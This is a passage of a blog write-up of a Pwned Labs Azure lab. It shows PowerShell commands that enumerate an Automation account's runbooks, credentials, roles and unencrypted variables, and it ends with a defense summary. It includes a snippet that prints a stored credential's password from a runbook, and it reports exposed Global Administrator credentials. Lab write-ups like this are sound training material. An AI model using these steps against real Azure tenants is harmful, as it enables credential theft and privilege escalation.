+</span></span><span class="line"><span class="cl"><span class="n">Encryption</span>            <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="py">Azure</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">Models</span><span class="p">.</span><span class="py">EncryptionProperties</span>
+</span></span><span class="line"><span class="cl"><span class="n">PublicNetworkAccess</span>   <span class="err">:</span> <span class="n">True</span>
+</span></span></code></pre></div><p>Since we have <code>PublicNetworkAccess</code> set to <code>True</code> we can export the Runbook with <code>Export-AzAutomationRunbook</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Export-AzAutomationRunbook</span> <span class="n">-ResourceGroupName</span> <span class="s2">&#34;mbt-rg-5&#34;</span> <span class="n">-AutomationAccountName</span> <span class="s2">&#34;automation-dev&#34;</span> <span class="n">-Name</span> <span class="nb">Schedule-VMStartStop</span> <span class="n">-Output</span> <span class="p">.</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/mBhBM5z.png"></p>
+<p>As shown below this file doesn&rsquo;t contain any hardcoded credentials or sensitive information that would be useful from an attacker scenario.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">file</span> <span class="nb">Schedule-VMStartStop</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Schedule-VMStartStop</span><span class="p">.</span><span class="n">ps1</span><span class="err">:</span> <span class="n">ASCII</span> <span class="n">text</span><span class="p">,</span> <span class="n">with</span> <span class="n">CRLF</span> <span class="n">line</span> <span class="n">terminators</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">cat Schedule-VMStartStop</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="k">param</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="nb">Parameter</span><span class="p">(</span><span class="na">Mandatory</span><span class="p">=</span><span class="vm">$true</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="no">string</span><span class="p">]</span> <span class="nv">$Action</span> <span class="c"># Should be either &#39;Start&#39; or &#39;Stop&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Authenticate with Azure</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Conn</span> <span class="p">=</span> <span class="nb">Get-AutomationConnection</span> <span class="n">-Name</span> <span class="n">AzureRunAsConnection</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Connect-AzAccount</span> <span class="n">-ServicePrincipal</span> <span class="n">-TenantId</span> <span class="nv">$Conn</span><span class="p">.</span><span class="py">TenantId</span> <span class="n">-ApplicationId</span> <span class="nv">$Conn</span><span class="p">.</span><span class="py">ApplicationId</span> <span class="n">-CertificateThumbprint</span> <span class="nv">$Conn</span><span class="p">.</span><span class="py">CertificateThumbprint</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Fetch VMs based on tags</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$VMsToProcess</span> <span class="p">=</span> <span class="nb">Get-AzVM</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Tags</span><span class="p">[</span><span class="s2">&#34;AutoStart&#34;</span><span class="p">]</span> <span class="o">-eq</span> <span class="s2">&#34;True&#34;</span> <span class="o">-and</span> <span class="nv">$Action</span> <span class="o">-eq</span> <span class="s2">&#34;Start&#34;</span><span class="p">)</span> <span class="o">-or</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Tags</span><span class="p">[</span><span class="s2">&#34;AutoStop&#34;</span><span class="p">]</span> <span class="o">-eq</span> <span class="s2">&#34;True&#34;</span> <span class="o">-and</span> <span class="nv">$Action</span> <span class="o">-eq</span> <span class="s2">&#34;Stop&#34;</span><span class="p">)</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$VM</span> <span class="k">in</span> <span class="nv">$VMsToProcess</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$Action</span> <span class="o">-eq</span> <span class="s2">&#34;Start&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Start the VM</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">Start-AzVM</span> <span class="n">-Name</span> <span class="nv">$VM</span><span class="p">.</span><span class="py">Name</span> <span class="n">-ResourceGroupName</span> <span class="nv">$VM</span><span class="p">.</span><span class="py">ResourceGroupName</span> <span class="n">-ErrorAction</span> <span class="k">Continue</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$Action</span> <span class="o">-eq</span> <span class="s2">&#34;Stop&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Stop the VM</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">Stop-AzVM</span> <span class="n">-Name</span> <span class="nv">$VM</span><span class="p">.</span><span class="py">Name</span> <span class="n">-ResourceGroupName</span> <span class="nv">$VM</span><span class="p">.</span><span class="py">ResourceGroupName</span> <span class="n">-Force</span> <span class="n">-ErrorAction</span> <span class="k">Continue</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">Write-Output</span> <span class="s2">&#34;Invalid Action Specified&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Output</span> <span class="s2">&#34;Processed all VMs for action: </span><span class="nv">$Action</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><h2 id="credential-security-in-automation-accounts"><strong>Credential Security in Automation Accounts</strong><a hidden class="anchor" aria-hidden="true" href="#credential-security-in-automation-accounts">#</a></h2>
+<p>It&rsquo;s also important to check for credentials configured in the automation account because automation tasks often require authentication to interact with various resources. While the actual password is not directly accessible, the credentials are still available for use within Runbooks to perform tasks that require authentication, such as managing resources or executing scripts. This ensures that the automation can securely access necessary resources without manual intervention.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-AzAutomationCredential</span> <span class="n">-ResourceGroupName</span> <span class="s2">&#34;mbt-rg-5&#34;</span> <span class="n">-AutomationAccountName</span> <span class="s2">&#34;automation-dev&#34;</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">Name</span><span class="p">,</span> <span class="n">CreationTime</span><span class="p">,</span> <span class="n">Description</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/HsSrdry.png"></p>
+<p>We can check if we have write access to the <code>automation-dev</code> automation account using the <code>Get-AzRoleAssignment</code> command.</p>
+<p><img loading="lazy" src="https://i.imgur.com/4T2TtM6.png"></p>
+<p>As shown above we only have the <code>Reader</code> role meaning we can&rsquo;t edit the Runbook, if we could, we would append the following PowerShell to the script and see the credentials in the job output.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-AutomationPSCredential</span> <span class="n">-Name</span> <span class="nb">automate-default</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span><span class="p">.</span><span class="py">GetNetworkCredential</span><span class="p">().</span><span class="py">UserName</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cred</span><span class="p">.</span><span class="py">GetNetworkCredential</span><span class="p">().</span><span class="py">Password</span>
+</span></span></code></pre></div><p>If you are still interested in knowing how to edit the Runbook regardless of the missing permissions then refer to my alternate blog, <a href="https://sec-fortress.github.io/posts/articles/posts/Edit%20a%20Runbook%20in%20Azure%20and%20append%20a%20PowerShell%20script%20to%20retrieve%20credentials.html">Link Here</a>.</p>
+<h2 id="identifying-unencrypted-variables"><strong>Identifying Unencrypted Variables</strong><a hidden class="anchor" aria-hidden="true" href="#identifying-unencrypted-variables">#</a></h2>
+<p>Azure Automation supports variable assets, which are globally accessible variables for Runbooks. Sensitive variables like keys and passwords should be encrypted for security. However, in this instance, it appears that a sensitive variable was stored unencrypted, posing a security risk. This oversight could potentially grant unauthorized access to critical information, highlighting the importance of proper security practices in automation accounts.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-AzAutomationVariable</span> <span class="n">-ResourceGroupName</span> <span class="s2">&#34;mbt-rg-5&#34;</span> <span class="n">-AutomationAccountName</span> <span class="s2">&#34;automation-dev&#34;</span> <span class="p">|</span> <span class="nb">fl </span><span class="n">Name</span><span class="p">,</span> <span class="n">Value</span><span class="p">,</span> <span class="n">Description</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/M5qOssF.png"></p>
+<p>As shown above we have the flag value and a Global administrator credential, haha ᯓ★.</p>
+<h2 id="summary-x-defense"><strong>Summary X Defense</strong><a hidden class="anchor" aria-hidden="true" href="#summary-x-defense">#</a></h2>
+<p>Employees often unintentionally expose sensitive information on social media, which red teams can exploit for phishing and password creation. In one case, an employee believed they had redacted sensitive data using iOS Markup, but it was recoverable due to transparency issues. Additionally, we exploited an exposed password in the <code>.bash_history</code> file, highlighting the risks of passing passwords via command lines, which can be logged in history files and Windows event logs, however to authenticate without a browser, we used <code>az login --use-device-code</code> to force device code authentication for more security. Finally, we obtained global admin credentials due to insecure secret storage, emphasizing the importance of saving sensitive data as encrypted variables, which are not encrypted by default.</p>
+<h2 id="resources"><strong>Resources</strong><a hidden class="anchor" aria-hidden="true" href="#resources">#</a></h2>
+<ul>
+<li><strong>Lab Link :</strong> <a href="https://pwnedlabs.io/labs/unmask-privileged-access-in-azure">https://pwnedlabs.io/labs/unmask-privileged-access-in-azure</a></li>
+<li><a href="https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0">https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0</a></li>
+<li><a href="https://medium.com/@mgbecken/roadtools-1e9dabc2c8e9">https://medium.com/@mgbecken/roadtools-1e9dabc2c8e9</a></li>
+<li><a href="https://learn.microsoft.com/en-us/azure/automation/automation-security-overview">https://learn.microsoft.com/en-us/azure/automation/automation-security-overview</a></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/azure/">Azure</a></li>
+      <li><a href="http://localhost:1313/tags/red-teaming/">Red Teaming</a></li>
+      <li><a href="http://localhost:1313/tags/entra-id/">Entra-ID</a></li>
+      <li><a href="http://localhost:1313/tags/powershell/">Powershell</a></li>
+      <li><a href="http://localhost:1313/tags/roadrecon/">ROADrecon</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Azure Recon to Foothold and Profit</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
